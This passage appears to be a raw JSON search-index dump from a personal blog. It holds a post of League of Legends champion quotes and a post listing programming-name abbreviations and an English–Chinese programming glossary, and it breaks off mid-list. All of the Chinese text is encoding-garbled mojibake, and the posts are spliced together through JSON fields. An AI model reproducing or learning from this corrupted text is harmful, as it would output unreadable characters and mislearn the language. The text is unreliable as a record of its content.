æˆ‘æ˜¯é­”é¬¼ï¼ä¸è®¸ç¬‘ï¼â€“é‚ªæ¶å°æ³•å¸ˆ ä¸€åˆ‡å°½åœ¨å¡ç‰Œä¹‹ä¸­ã€‚â€“å¡ç‰Œå¤§å¸ˆ æ˜¯æ‘‡ï¼Œè¿˜æ˜¯ä¸æ‘‡ï¼Œè¿™æ˜¯ä¸€ä¸ªé—®é¢˜ã€‚â€“ç‚¼é‡‘æœ¯å£« åƒæˆ‘ä¸€è®°é‡å‡»ï¼â€“äº¡çµå‹‡å£« ä¸­åœºä¼‘æ¯æ—¶é—´ï¼â€“ç´ç‘Ÿä»™å¥³ æˆ‘æƒ³æˆ‘ä¼šè®©ä½ éš¾å—ä¸€é˜µå­çš„ï¼â€“å®çŸ³éª‘å£« æˆ‘ç”¨æ„å¿µä¼ è¾¾ç»™æ‚¨ã€‚â€“ç´ç‘Ÿä»™å¥³ è¿™é¦–æ˜¯æ…¢æ¿æ›²ï¼Œå¬å”¤å¸ˆã€‚â€“ç´ç‘Ÿä»™å¥³ å®Œç¾çš„èŠ‚æ‹ã€‚â€“ç´ç‘Ÿä»™å¥³ æˆ‘ä¼šæ‚¼å¿µä½ çš„ã€‚â€“å®çŸ³éª‘å£« å¦‚æœå–„å¾…åŠ¨ç‰©åä¼šé—®èµ·æ¥çš„è¯ï¼Œæˆ‘ä»¬å°±è¯´è¿™äº›çš®æ¯›æ˜¯ä»¿åˆ¶çš„ã€‚â€“é‡å…½ä¹‹çµ æˆ‘å®æ„¿ç›¸ä¿¡ä¸€åˆ‡ï¼Œä¹Ÿä¸æ„¿å†ç›¸ä¿¡ä¸–äººï¼Œåªæœ‰é‡å…½èƒ½å‘Šè¯‰æˆ‘ä»€ä¹ˆå«æ„Ÿæƒ…ã€‚â€“é‡å…½ä¹‹çµ å¿ è¯šä¹‹å¿ƒæ°¸ä¸åœæ¯ã€‚â€“é¦–é¢†ä¹‹å‚² æˆ‘çš„`é“è·¯ï¼Œæ¸…æ¾ˆæ— æ¯”ã€‚â€“ä¼—æ˜Ÿä¹‹å­ æˆ‘ä¼šä¸‹è¾¾å‘½ä»¤ã€‚â€“ç­–å£«ç»Ÿé¢† ä¿ºå¾ˆç”Ÿæ°”ï¼Œåæœå¾ˆä¸¥é‡ï¼â€“ç‰›å¤´é…‹é•¿ è§†æ­»å¦‚å½’ï¼Œå°±åœ¨ä»Šå¤©ï¼â€“å˜‰æ–‡å››ä¸– æ­£åšç€å‘¢ï¼â€“å¡ç‰Œå¤§å¸ˆ å¦‚æœæˆ‘èƒ½ä¼‘æ¯å°±å¥½äº†ã€‚â€“æ‰­æ›²æ ‘ç²¾ è¦è±¡å¾ç¾å¥½æ—¶å…‰ï¼Œè¯·æ‰¾ç¥ç€ã€‚â€“å®çŸ³éª‘å£« ä½ æ˜¯æ²¡æœ‰æœºä¼šèµ¢æˆ‘çš„ã€‚â€“è›®æ—ä¹‹ç‹ æ²¡æœ‰é€€è·¯äº†ï¼â€“åˆ€é”‹æ„å¿— äº¡å‘½å¤©æ¶¯ï¼Œåªæ˜¯ä¸ºäº†è¿½å¯»ä½ çš„è¶³è¿¹ã€‚å´ä¸æƒ³å‘½è¿çš„æ‰å¼„ï¼Œæ€»æ˜¯è®©ä½ æˆ‘å¤©å„ä¸€æ–¹ã€‚â€“æ³•å¤–ç‹‚å¾’ æ°¸æ’ç—›è‹¦çš„èµ å“ã€‚â€“é¦–é¢†ä¹‹å‚² æˆ˜æ–—å§ï¼â€“æˆ˜äº‰å¥³ç¥ è¿™å°±æ˜¯æˆ‘æ”¶å…»é‚£äº›æµæµªå‰‘åˆƒçš„ç»“æœã€‚â€“åˆ€é”‹æ„å¿— æˆ‘å¥½æƒ³å°„ç‚¹å„¿ä»€ä¹ˆï¼â€“éº¦æ—ç‚®æ‰‹ ç‹©çŒçš„æ—¶å€™åˆ°äº†ã€‚â€“å—œè¡€çŒæ‰‹ æˆ‘ä¹Ÿè¯•å›¾ç»ˆç»“è¿‡è¿™å›°æ‰°ï¼Œä½†å®ƒæ€»ä¼šå·åœŸé‡æ¥ã€‚â€“æ‰­æ›²æ ‘ç²¾ æ‰§è¡Œå‡è¡¡ä¹‹ä»¤ã€‚â€“æš®å…‰ä¹‹çœ¼ å¾·ç›è¥¿äºšï¼Œæ°¸ä¸–é•¿å­˜ï¼â€“å˜‰æ–‡å››ä¸– æ˜¯ï¼Œé•¿å®˜ï¼â€“è¿…æ·æ–¥å€™ ä¸è¦å¦è®¤ä½ çš„æœ¬èƒ½ï¼Œå¬å”¤å¸ˆã€‚â€“é‡å…½ä¹‹çµ ä½ æˆ‘çš„çº¦å®šï¼Œæˆ‘ä¸€ç›´è®°å¾—ã€‚é‚£ä¸€é“é“ç’€ç’¨çš„å…‰è¾‰ï¼Œéƒ½æ˜¯ä¸ºä½ æ‰€äº®ã€‚â€“å…‰è¾‰å¥³éƒ æˆ‘æ„šè ¢çš„ä»¥ä¸ºï¼Œå¤´ä¸Šçš„é‡‘ç®åœˆå¯ä»¥åœˆä½ä½ æ‰€æœ‰çš„çˆ±ï¼Œå¯æ˜¯æˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’æ”¹å˜ä¸äº†é‚£ä¸ªå¼€å§‹ï¼Œä¹Ÿå†³å®šä¸äº†è¿™ä¸ªç»“å±€ï¼Œæ ¹æœ¬æ²¡æœ‰é½å¤©å¤§åœ£ï¼Œæˆ‘åªæ˜¯ä¸€åªçŒ´å­ã€‚â€“é½å¤©å¤§åœ£ è¿™å¾ˆå¥½ç©å–ï¼â€“æ¶é­”å°ä¸‘ æˆ‘å¯¹ä½ çš„çˆ±å°±å¦‚é—ªç”µï¼Œç‹‚æš´è€Œå‰§çƒˆï¼Œé£å‡ºçš„é£é•–ï¼Œæ˜¯æˆ‘å‘ä½ ä¼ è¾¾çš„æ€å¿µã€‚â€“ç‹‚æš´ä¹‹å¿ƒ æˆ‘é†’æ¥äº†ï¼Œä½†æ˜¯ä»€ä¹ˆéƒ½ä¸è®°å¾—ï¼Œæˆ‘å¾ˆå®³æ€•ï¼Œæˆ‘åŒ…è£¹ä½è‡ªå·±çš„èº«ä½“ï¼Œç‹¬è‡ªåœ¨é»‘æš—ä¸­å“­æ³£ã€‚â€“æ®‡ä¹‹æœ¨ä¹ƒä¼Š ä¸ºäº†å†…å¿ƒçš„å®‰å®ã€‚â€“ä¼—æ˜Ÿä¹‹å­ åƒèŠ‚æ‹å™¨ä¸€æ ·å‡†ç¡®æ— è¯¯ã€‚â€“ç´ç‘Ÿä»™å¥³ ç¨³æ­¥å‰è¿›ï¼â€“åˆ€é”‹æ„å¿— æ¥æ¬¡é­”æœ¯æˆæ³•ï¼Œå’‹æ ·ï¼Ÿâ€“æ¶é­”å°ä¸‘ ä½ çš„äº²å‹ä»¬æ­£åœ¨é¥±å—æŠ˜ç£¨ï¼â€“é‚ªæ¶å°æ³•å¸ˆ ç‰©æ˜¯äººéï¼Œå¯æ˜¯æˆ‘ä¾ç„¶ç©¿ç€å«è¡£ï¼Œåœ¨é»‘æš—ä¸­å¯»æ‰¾ä½ çš„èº«å½±ã€‚â€“å¯¡å¦‡åˆ¶é€ è€… å¥½æäº†ï¼â€“çŒ©çº¢æ”¶å‰²è€… æˆ‘ä¸é¡¾ä¸€åˆ‡çš„å†²å‡ºå»ï¼Œä¸ºä½ å¼€è¾Ÿä¸€æ¡å®‰ç¨³çš„è·¯ï¼Œæˆ‘æ»¡è…”çƒ­è¡€çš„æ‹æ‰“ç€ï¼Œä¸ºä½ æŠ›å¼€ä»»ä½•ç»Šè„šçš„çŸ³ï¼Œæœ€åï¼Œæˆ‘å¦ç„¶çš„å¾®ç¬‘ç€ç”¨æˆ‘çš„èº«ä½“ä¸ºä½ æŠµæŒ¡ä¸€åˆ‡â€¦å› ä¸ºæˆ‘çš„èº«ä½“ä¸Šæ—‹è½¬ç€æˆ‘ä»¬çš„èª“è¨€ã€‚â€“ç‰›å¤´é…‹é•¿ ä½ ä»¬è·Œå€’äº†æ²¡ï¼Ÿå´©æºƒäº†ä¹ˆï¼Ÿâ€“éº¦æ—ç‚®æ‰‹ èƒœåˆ©åœ¨æœ›ã€‚â€“ç­–å£«ç»Ÿé¢† æ”˜é™¤å¥¸é‚ªï¼â€“å˜‰æ–‡å››ä¸– æˆ‘è‡ªäººç±»è¯ç”Ÿï¼Œå´è¢«äººç±»æŠ›å¼ƒï¼Œå­¤ç‹¬çš„å¾˜å¾Šäºä¸–é—´ï¼Œå´ä¸ä¸–é—´æ ¼æ ¼ä¸å…¥ï¼Œäºæ˜¯æˆ‘åªèƒ½è¯•å›¾æŠ“ä½æ¯ä¸ªé‡åˆ°çš„ç”Ÿå‘½ï¼Œå»å€¾è¯‰é‚£é¢—ä»ä¸è¢«ç†è§£çš„å¿ƒã€‚â€“è’¸æ°”æœºå™¨äºº ä¸ºäº†çˆ¶ç‹ï¼â€“å˜‰æ–‡å››ä¸– è¿™å±€èƒœè´Ÿå·²å®šã€‚â€“å—œè¡€çŒæ‰‹ æ¼«å¤©çš„å†°é›ªå†»ç»“äº†æˆ‘çš„å¿ƒï¼Œä½†å®ƒå†»ç»“ä¸äº†æˆ‘å¿ƒä¸­çš„æ­£ä¹‰ï¼Œæˆ‘æ„¿ç”¨æˆ‘ä¸¥å¯’çš„èº«èº¯å†°å†»è¿™ä¸–é—´çš„é‚ªæ¶ã€‚â€“å†°æ™¶å‡¤å‡° å¥‰å¾ç‹ä¹‹å‘½ï¼â€“å¾·é‚¦æ€»ç®¡ æˆ‘å¯¹ä½ çš„çˆ±å°±å¦‚é—ªç”µï¼Œç‹‚æš´è€Œå‰§çƒˆï¼Œé£å‡ºçš„é£é•–æ˜¯å¯¹ä½ çš„æ€å¿µã€‚â€“ç‹‚æš´ä¹‹å¿ƒ ä½ å¿…é¡»è·Ÿç€ä¿ºï¼â€“ç‰›å¤´é…‹é•¿ å¼€æˆ˜å§ï¼â€“è›®æ—ä¹‹ç‹ ä»æˆ‘æ‰‹ä¸­è„±ç¦»çš„åˆ€åˆƒä¸€ç›´åœ¨é£èˆï¼Œæˆ‘ä¸æ–­åœ¨å˜å¼ºï¼Œåªæ˜¯ä¸ºäº†å®ˆæŠ¤æˆ‘ä»¬çš„å®¶å›­ï¼Œç­‰å€™ä½ çš„å½’æ¥ã€‚â€“åˆ€é”‹æ„å¿— çœŸæ­£çš„æ„å¿—æ˜¯ä¸ä¼šè¢«å‡»è´¥çš„ï¼â€“åˆ€é”‹æ„å¿— æˆ‘ä¹Ÿå¸Œæœ›å˜æˆè´è¶çš„é‚£ä¸€å¤©ï¼Œä¸å†ç°è‰²ï¼Œä¸å†ç—›è‹¦ï¼Œä¸å†è®©æˆ‘ä¸‘é™‹çš„å¤–è¡¨å“åˆ°ç¾ä¸½çš„ä½ ã€‚â€“æ·±æ¸Šå·¨å£ æˆ‘ä¼šåœ¨é‚£å„¿çš„ã€‚â€“ç˜Ÿç–«ä¹‹æº æˆ‘å¯ä»¥æƒ³å»å“ªé‡Œå°±å»å“ªé‡Œï¼Œä½†æ˜¯æˆ‘åªæƒ³å»ä½ å¿ƒé‡Œã€‚â€“ç¥–å®‰ç‹‚äºº éšå¿ƒè€ŒåŠ¨ï¼Œéšåˆƒè€Œè¡Œï¼â€“è›®æ—ä¹‹ç‹ æˆ‘çš„ç›®æ ‡å¾ˆçº¯ç²¹ã€‚â€“ç­–å£«ç»Ÿé¢† æˆ‘è§‰å¾—æˆ‘â€¦å˜å›äººç±»äº†â€¦â€“å—œè¡€çŒæ‰‹ æ˜¯çš„ï¼Œåªè¦998ï¼Œå°±èƒ½è®©ä½ çˆ½åˆ°ä¸èƒ½å‘¼å¸å“Ÿã€‚â€“é£æš´å¥³ç¥ æˆ‘ä»¬ä¸çŸ¥é“ä½•ä¸ºæ€œæ‚¯ï¼Œå³ä½¿å¯¹è±¡æ˜¯ä½ ï¼â€“é‡å…½ä¹‹çµ ä½ å·²ç»æ­»äº†â€¦åªæ˜¯ä½ è¿˜æ²¡å‘è§‰è€Œå·²ã€‚â€“æš®å…‰ä¹‹çœ¼ ç”Ÿå­˜ï¼Œå°±æ˜¯æŠ˜ç£¨ã€‚â€“é¦–é¢†ä¹‹å‚² è¯ºå…‹è¨æ–¯äººä»æ¥ä¸ä¼šé—²é€›ã€‚â€“ç­–å£«ç»Ÿé¢† å“¦å¥½çš„ï¼Œå¥½çš„ï¼â€“ç˜Ÿç–«ä¹‹æº éå¸¸è£å¹¸ã€‚â€“æš®å…‰ä¹‹çœ¼ æœ‰æƒ…å†µï¼â€“è¿…æ·æ–¥å€™ å…¥ä½“å†°å‡‰çš„æœˆå…‰ï¼Œéƒ½æ¯”ä¸ä¸Šä½ ç»æƒ…çš„ç›®å…‰ã€‚ä¸ºäº†å‡»ç¢ä½ ä¼ªè£…çš„è¡¨é¢ï¼Œæˆ‘åªèƒ½ç”¨å°½å…¨èº«åŠ›æ°”æŒ¥å‡ºé‚£æƒŠé¸¿çš„åŠæœˆå¼§å…‰ã€‚â€”â€”çšæœˆå¥³ç¥ æˆ‘æŸç¼šä½äº†ä½ çš„äººï¼Œå´æŸç¼šä¸ä½ä½ çš„å¿ƒã€‚æ‰€ä»¥æˆ‘åªèƒ½è¿œè¿œè·³ç¦»ä½ èº«è¾¹ï¼Œå› ä¸ºæˆ‘çŸ¥é“ï¼Œç¦»ä½ è¶Šè¿‘ï¼Œæˆ‘çš„å¿ƒå°±ä¼šè¶Šç—›ã€‚â€”â€”çš®åŸå¥³è­¦ æ²™æ¼ ä¸­çš„å¤ªé˜³ï¼Œæ˜¯æˆ‘å¯¹ä½ çˆ±çš„è±¡å¾ã€‚â€”â€”æ²™æ¼ æ­»ç¥ åœ¨æ— äººæ³¨è§†çš„è§’è½ï¼Œç‹¬è‡ªé»˜é»˜çš„å¼¹å¥ã€‚ç´éŸ³å¸¦ç€æˆ‘çš„æ€æ‹ï¼Œå¦„å›¾æ‹‰ä½ä½ è½¬èº«è€Œå»çš„è¢–è§’ã€‚â€”â€”ç´ç‘Ÿä»™å¥³ æˆ‘è¿½é€çš„æ˜¯ä½ çš„èƒŒå½±ï¼Œæˆ‘è·Ÿéšçš„æ˜¯ä½ çš„å¾®ç¬‘ã€‚å°±ç®—æš´é£é›¨åˆ°æ¥ï¼Œæˆ‘ä¾ç„¶èƒ½åœ¨ä½ å·¦å³ã€‚â€”â€”é›·éœ†å’†å“® é»˜é»˜çš„åœ¨èƒŒåæœ›ç€ä½ çš„èƒŒå½±ï¼Œå½“ä½ æœ‰å±é™©æ—¶æˆ‘ä¼šæ¯«ä¸çŠ¹è±«çš„ä»å¤©è€Œé™ã€‚å“ªæ€•åŒè…¿éœ‡å¾—ç”Ÿç–¼ï¼Œæˆ‘ä¾ç„¶ä¼šå’¬ç´§ç‰™å…³å†æ¬¡è·³å‘å¯¹æ‰‹ï¼ŒæŠ›å‡ºæ‰‹ä¸­çš„æˆ˜çŸ›ã€‚å“ªæ€•æ˜¯æ­»ï¼Œæˆ‘ä¹Ÿè¦ä¿æŠ¤ä½ çš„å®‰å…¨ã€‚â€”â€”æˆ˜äº‰ä¹‹ç‹ åˆ«çœ‹æˆ‘çš„çœ¼ç›ï¼Œé‡Œé¢åªæœ‰æ„¤æ€’å’Œç—›è‹¦ã€‚æˆ‘è¯…å’’ç€ä¸€åˆ‡ï¼Œä¹Ÿè¯…å’’ç€è‡ªå·±ã€‚â€”â€”é­”è›‡ä¹‹æ‹¥ é‡‘è‰²çš„é•¿é©½é™ªä¼´æˆ‘çš„ä¸€ç”Ÿï¼Œæ²¾æ»¡é²œè¡€çš„åŒæ‰‹å´ç£¨ç­ä¸äº†å¿ƒä¸­çš„ä¼¤ç—›ï¼Œæˆ‘ç¿»è…¾ç€èº«å½±åœ¨äººç¾¤ä¸­é—ªçƒï¼Œå¯»æ‰¾ä¸€å¥æœ€çœŸå¿ƒçš„é—®å€™ã€‚ç„¶åæˆ‘æ‚„æ‚„çš„éšæ²¡ã€éšæ²¡ï¼Œéšæ²¡åœ¨é‚£å­¤å¯‚çš„è‰ä¸›â€¦â€¦â€”â€”æš—å¤œçŒæ‰‹ è¡Œèµ°äºè™šç©ºï¼Œæˆ‘å½·å¾¨ï¼Œæˆ‘è¿·èŒ«ã€‚æˆ‘ä¸çŸ¥ä½•å»ä½•ä»ï¼Œåªæœ‰é£˜é£˜è¡è¡ã€‚â€”â€”è™šç©ºè¡Œè€… é€äºæ™¨ï¼Œè¯äºæš®ã€‚è¿½å¯»ç€èŠ³é¦™çš„è¡€æ¶²ï¼Œç¯äºä¸–ä¸å¢“ä¹‹é—´ã€‚â€”â€”çŒ©çº¢æ”¶å‰²ç€ å°˜å°åƒå¹´ï¼Œè‚‰ä½“æ—©å·²æ¹®ç­ï¼Œæ„è¯†å·²ç„¶ä¸æ¸…ã€‚æ¢ç´¢äº†å…¨éƒ¨é­”æ³•çš„å¥¥ç§˜ï¼Œåªä¸ºèƒ½å¼€è¾Ÿè™šç©ºï¼Œå¯»æ‰¾æ—©å·²å¤±å»çš„ä½ ã€‚â€”â€”è¿œå¤å·«çµ ä½ æ€»è¯´æˆ‘å¤ªå°ï¼Œä½†æ˜¯å‡ºç°å±é™©æˆ‘éƒ½ä¼šè·³è·ƒåˆ°ä½ èº«è¾¹ï¼Œå°†å±é™©æ¨å¼€ã€‚ç”¨æ‰‹ä¸­çš„ç‚®ç­’ï¼Œå®ˆæŠ¤æˆ‘å°å°çš„çˆ±ã€‚â€”â€”éº¦æ—ç‚®æ‰‹ ç‚™çƒ­çš„é“æ‹³ç ¸ä¸å¼€ä½ é¢å‰çš„ç‰¢ç¬¼ï¼Œä¸ç”˜æ”¾å¼ƒçš„åŠªåŠ›ï¼Œåªä¸ºäº†æœ‰ä¸€å¤©èƒ½ç ¸å¼€ç‰¢ç¬¼è§ä½ ä¸€é¢ã€‚â€”â€”çš®åŸæ‰§æ³•å®˜","tags":[{"name":"è¯­å½•","slug":"è¯­å½•","permalink":"https://hodlyounger.github.io/tags/%E8%AF%AD%E5%BD%95/"},{"name":"LOL","slug":"LOL","permalink":"https://hodlyounger.github.io/tags/LOL/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Game","slug":"E-æ‰‹å†Œ/Game","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Game/"}]},{"title":"ã€Englishã€‘å¸¸è§ç¼–ç¨‹å‘½åç¼©å†™","date":"2023-10-27T01:24:02.471Z","path":"E_æ‰‹å†Œ/En/ã€Englishã€‘å¸¸è§å‘½åç¼©å†™/","text":"é€šç”¨ ç¼©å†™ ç¿»è¯‘ æ§ä»¶ ç¼©å†™ ç¿»è¯‘ address addr åœ°å€ calendar cdr æ—¥å† application app åº”ç”¨ç¨‹åº messageDialog msgdlg æ¶ˆæ¯æ¡† asynchronization asyn å¼‚æ­¥ drawer drw æŠ½å±‰ average avg å¹³å‡æ•° buttonGroup btngrp æŒ‰é’®åˆ†ç»„ bitmap bmp ä½å›¾ checkBox chk å¤é€‰æ¡† buffer buf ç¼“å†²åŒº container cntr å®¹å™¨ character char å­—ç¬¦ button btn æŒ‰é’® color clr é¢œè‰² comboBox cmb ä¸‹æ‹‰æ¡† command cmd å‘½ä»¤ lable lbl æ ‡ç­¾ delete del åˆ é™¤ progressBar prg è¿›åº¦æ¡ destination dest/dst ç›®çš„åœ° pageIndicator pgindic Tabåˆ†é¡µæ§ä»¶ decrease dec å‡å°‘ radioButton rdo å•é€‰æ¡† device dev è®¾å¤‡ rangeSlider rngsld æ»‘å— different diff ä¸åŒçš„ scrollView svw è§†å›¾æ»šåŠ¨ directory dir ç›®å½• scrollBar vsb(å‚ç›´)/hsb(æ°´å¹³) æ»šåŠ¨æ¡ document doc æ–‡æ¡£ slider sld æ»‘åŠ¨å™¨ dynamic dyna åŠ¨æ€çš„ spinBox spn æ—‹è½¬æ¡† environment env ç¯å¢ƒ splitView spltvw åˆ†å‰²è§†å›¾ error err é”™è¯¯ stackView stackvw å †æ ˆè§†å›¾ execute exec æ‰§è¡Œ statusBar statbr çŠ¶æ€æ¡ group grp ç»„ swipeView swpvw æ»‘åŠ¨æ§ä»¶ image img å›¾åƒ switch sw å¼€å…³ information info ä¿¡æ¯ tabBar tbbr tabæ  initialize init åˆå§‹åŒ– textField txtfld æ–‡æœ¬è¾“å…¥æ¡† library lib åº“ toolBar tlbr å·¥å…·æ  maximum max æœ€å¤§å€¼ toolTip tltp æç¤ºæ¡† minimum min æœ€å°å€¼ toolButton tlbtn å·¥å…·æŒ‰é’® message msg æ¶ˆæ¯ treeView trvw æ ‘å½¢è§†å›¾ number num æ•°å­—ï¼Œæ•°ï¼Œæ•°é‡ layout lyt å¸ƒå±€ object obj å¯¹è±¡ mainMenu mmnu èœå•æ  parameter Param å‚æ•°(å½¢å‚) groupBox gbx ç»„åˆæ¡† package pkg æ‰“åŒ… pictureBox pic å›¾ç‰‡æ¡† position pos ä½ç½® listView lvw åˆ—è¡¨è§†å›¾ previous pre å‰ä¸€ä¸ª window win(wnd) çª—å£ process/Procedure proc è¿›ç¨‹/è¿‡ç¨‹ form frm è¡¨å• pointer ptr æŒ‡é’ˆ textBox txt æ–‡æœ¬æ¡† password pwd å¯†ç  linkLabel llbl è¶…é“¾æ¥æ ‡ç­¾æ¡† public pub å…¬å…±çš„ dialog dlg å¯¹è¯æ¡† reference ref å¼•ç”¨ scrollIndicator scrlindic æ»šåŠ¨æŒ‡ç¤ºå™¨ source src æº string str å­—ç¬¦ä¸² summation sum å’Œ synchronization sync åŒæ­¥ system sys ç³»ç»Ÿ table tbl è¡¨æ ¼ temporary tmp ä¸´æ—¶ text txt æ–‡æœ¬ variable var å˜é‡ addition add åŠ æ³•/æ·»åŠ  argument arg å®å‚ array arr æ•°ç»„ calculate calc è®¡ç®— configuration config é…ç½® column col åˆ— control ctrl æ§åˆ¶ hexadecimal hex åå…­è¿›åˆ¶ original orig åŸä»¶ return rtn è¿”å› repeat rpt é‡å¤ signal sig ä¿¡å· status stat çŠ¶æ€ stack stk æ ˆåŒº standard std æ ‡å‡† trigger trig è§¦å‘ background bg èƒŒæ™¯ escape esc é€€å‡º user usr ç”¨æˆ· list lst åˆ—è¡¨ server srv æœåŠ¡ manager mgr ç®¡ç†è€… insert ins æ’å…¥ point pt ç‚¹ function func å‡½æ•° back bk è¿”å› break brk é—´æ–­ date dat æ—¥æœŸ edit edt ç¼–è¾‘ flag flg æ ‡å¿— grid grd ç½‘æ ¼ increment inc å¢é‡ length len é•¿åº¦ oracle ora ç”²éª¨æ–‡æ•°æ®åº“ panorama pano å…¨æ™¯ print prn æ‰“å° program prg ç¨‹åº statistic stat ç»Ÿè®¡ administrator adm ç®¡ç†å‘˜ database db æ•°æ®åº“ change chg æ”¹å˜ click clk ç‚¹å‡» compare cmp æ¯”è¾ƒ coordinates coord åæ ‡ copy cpy å¤åˆ¶ current cur å½“å‰çš„ dictionary dict å­—å…¸ display disp æ˜¾ç¤º driver drv é©±åŠ¨ extend ex/ext æ‰©å±• frame frm æ¡†æ¶/å¸§ index idx/ndx ç´¢å¼• horizontal horz æ°´å¹³ instance ins å®ä¾‹ increase inc å¢åŠ  link lnk é“¾æ¥ middle mid ä¸­é—´ multiply mul ä¹˜ resource res èµ„æº select sel é€‰æ‹© test tst æµ‹è¯• vertical vert å‚ç›´ è‹±æ–‡æœ¯è¯­ æè¿° abstract æŠ½è±¡çš„ abstraction æŠ½è±¡æ€§ access è®¿é—® access level è®¿é—®çº§åˆ« access function è®¿é—®å‡½æ•° adapter é€‚é…å™¨ address åœ°å€ address-of operator å–åœ°å€æ“ä½œç¬¦ aggregation èšåˆ algorithm ç®—æ³• allocate åˆ†é… allocator åˆ†é…å™¨ application åº”ç”¨ç¨‹åº architecture ä½“ç³»ç»“æ„ argument å®å‚ array æ•°ç»„ arrow operator ç®­å¤´æ“ä½œç¬¦ assembly language æ±‡ç¼–è¯­è¨€ assert(-ion) æ–­è¨€ assign(-ment) èµ‹å€¼ assignment operator èµ‹å€¼æ“ä½œç¬¦ base class åŸºç±» base type åŸºç±»å‹ binary search äºŒåˆ†æŸ¥æ‰¾ binary tree äºŒå‰æ ‘ binary operator äºŒå…ƒæ“ä½œç¬¦ binding ç»‘å®š bit ä½ bitwise ä»¥ bit ä¸ºå•å…ƒé€ä¸€â€¦ block åŒºå— boolean å¸ƒå°”å€¼ breakpoint æ–­ç‚¹ build æ„å»º build-in å†…ç½® bus æ€»çº¿ byte å­—èŠ‚ cache é«˜é€Ÿç¼“å­˜ï¼ˆåŒºï¼‰ call è°ƒç”¨ callback å›è°ƒ call operator call æ“ä½œç¬¦ character å­—ç¬¦ child class å­ç±» class ç±» class template ç±»æ¨¡æ¿ client å®¢æˆ·ï¼ˆç«¯ï¼‰ code ä»£ç  compatible å…¼å®¹ compiler time ç¼–è¯‘æœŸ compiler ç¼–è¯‘å™¨ component ç»„ä»¶ composition å¤åˆ concrete å…·è±¡çš„ concurrent å¹¶å‘ configuration é…ç½® connection è¿æ¥ constraint çº¦æŸï¼ˆæ¡ä»¶ï¼‰ construct æ„ä»¶ container å®¹å™¨ const C++ å…³é”®å­—ï¼Œconstant çš„ç¼©å†™ constant å¸¸é‡ constructor æ„é€ å‡½æ•° copy æ‹·è´ï¼ˆåŠ¨è¯/åè¯ï¼‰ï¼Œå‰¯æœ¬ï¼ˆåè¯ï¼‰ create åˆ›å»º custom å®šåˆ¶ data æ•°æ® database æ•°æ®åº“ data member æ•°æ®æˆå‘˜ï¼ˆå˜é‡ï¼‰ data structure æ•°æ®ç»“æ„ debug è°ƒè¯• debugger è°ƒè¯•å™¨ declaration å£°æ˜å¼ default ç¼ºçœï¼ˆé»˜è®¤ï¼‰ definition å®šä¹‰å¼ delegate å§”æ‰˜ dereference æé¢†ï¼ˆè§£å‚è€ƒï¼‰ derived class æ´¾ç”Ÿç±» design pattern è®¾è®¡æ¨¡å¼ destroy é”€æ¯ destructor ææ„å‡½æ•° directive æŒ‡ç¤ºç¬¦ document æ–‡æ¡£ dynamic binding åŠ¨æ€ç»‘å®š entity ç‰©ä½“ encapsulation å°è£… enum(-eration) æšä¸¾ equality ç›¸ç­‰ equivalence ç­‰ä»· evaluate æ ¸å®šã€æ ¸ç®— exception å¼‚å¸¸ explicit æ˜¾å¼ expression è¡¨è¾¾å¼ file æ–‡ä»¶ framework æ¡†æ¶ full specialization å…¨ç‰¹åŒ– function å‡½æ•° function object å‡½æ•°å¯¹è±¡ function template å‡½æ•°æ¨¡æ¿ generic æ³›å‹ã€æ³›åŒ–ã€ä¸€èˆ¬åŒ– getter å–å€¼å‡½æ•° global å…¨å±€çš„ handle å¥æŸ„ handler å¤„ç†å‡½æ•° hash table å“ˆå¸Œè¡¨ã€æ•£åˆ—è¡¨ header(file) å¤´æ–‡ä»¶ heap å † hierarchy ç»§æ‰¿ä½“ç³» identifier æ ‡è¯†ç¬¦ implement(-ation) å®ç° implicit éšå–»çš„ã€æš—è‡ªçš„ã€éšå¼ information ä¿¡æ¯ inheritance ç»§æ‰¿ inline å†…è” initialization list åˆå§‹åŒ–åˆ—è¡¨ initialize åˆå§‹åŒ– instance å®ä½“ instantiate å®ä½“åŒ– interface æ¥å£ Internet äº’è”ç½‘ interpreter è§£é‡Šå™¨ invariants æ’å¸¸æ€§ invoke è°ƒç”¨ iterator è¿­ä»£å™¨ library ç¨‹åºåº“ linker è¿æ¥å™¨ literal å­—é¢å¸¸é‡ list é“¾è¡¨ load è£…è½½ local å±€éƒ¨çš„ lock æœºé” loop å¾ªç¯ lvalue å·¦å€¼ macro å® member æˆå‘˜ member function æˆå‘˜å‡½æ•° memory å†…å­˜ memory leak å†…å­˜æ³„æ¼ meta å…ƒ meta-programming å…ƒç¼–ç¨‹ modeling å¡‘è†œ module æ¨¡å— modifier ä¿®é¥°ç¬¦ multi-tasking å¤šä»»åŠ¡ namespace å‘½åç©ºé—´ native å›ºæœ‰çš„ nested åµŒå¥—çš„ object å¯¹è±¡ object based åŸºäºå¯¹è±¡çš„ object model å¯¹è±¡æ¨¡å‹ object oriented é¢å¯¹å¯¹è±¡ operand æ“ä½œæ•° operating system æ“ä½œç³»ç»Ÿ operator æ“ä½œç¬¦ overflow æº¢å‡º overhead é¢å¤–å¼€é”€ overload é‡è½½ override è¦†å†™ package åŒ… parallel å¹¶è¡Œ parameter å‚æ•°ã€å½¢å‚ parent class çˆ¶ç±» parse è§£æ partial specialization åç‰¹åŒ– pass by reference æŒ‰å€ä¼ é€’ pass by value æŒ‰å€¼ä¼ é€’ pattern æ¨¡å¼ placement delete ï¼ˆæŸç§ç‰¹æ®Šå½¢å¼çš„ delete operatoeï¼‰ placement new ï¼ˆæŸç§ç‰¹æ®Šå½¢å¼çš„ new operatoeï¼‰ pointer æŒ‡é’ˆ polymorphism å¤šæ€ preprocessor é¢„å¤„ç†å™¨ print æ‰“å° printer æ‰“å°æœº process è¿›ç¨‹ program ç¨‹åº programer ç¨‹åºå‘˜ programming ç¼–ç¨‹ project é¡¹ç›® pseudo code ä¼ªä»£ç  quality è´¨é‡ queue é˜Ÿåˆ— raw åŸå§‹çš„ã€æœªç»å¤„ç†çš„ recursive é€’å½’ refer to æŒ‡å‘ã€æŒ‡ç§° reference å¼•ç”¨ regular expression æ­£åˆ™è¡¨è¾¾å¼ resolve è§£æ return è¿”å› return type è¿”å›ç±»å‹ return value è¿”å›å€¼ runtime è¿è¡ŒæœŸ rvalue å³å€¼ save ä¿å­˜ schedule è°ƒåº¦ scheduler è°ƒåº¦å™¨ scope 